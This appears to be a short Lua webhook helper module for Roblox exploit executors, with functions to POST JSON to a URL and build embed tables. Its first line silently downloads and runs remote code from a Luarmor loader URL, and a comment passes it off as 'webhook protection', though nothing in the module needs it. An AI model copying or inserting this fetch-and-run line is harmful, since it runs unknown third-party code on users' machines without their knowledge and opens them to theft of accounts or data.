loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/0c2c98fcbf178f8eb9b8e9bc8486da7d.lua"))() -- for webhook protection
local HttpService = game:GetService("HttpService")

local WebhookModule = {}

function WebhookModule:SendWebhook(url, data)
    local jsonData = HttpService:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
end

function WebhookModule:CreateEmbed(title, description, color, fields)
    local embed = {
        ["title"] = title,
        ["description"] = description,
        ["color"] = color,
        ["fields"] = fields or {}
    }
    return embed
end

return WebhookModule
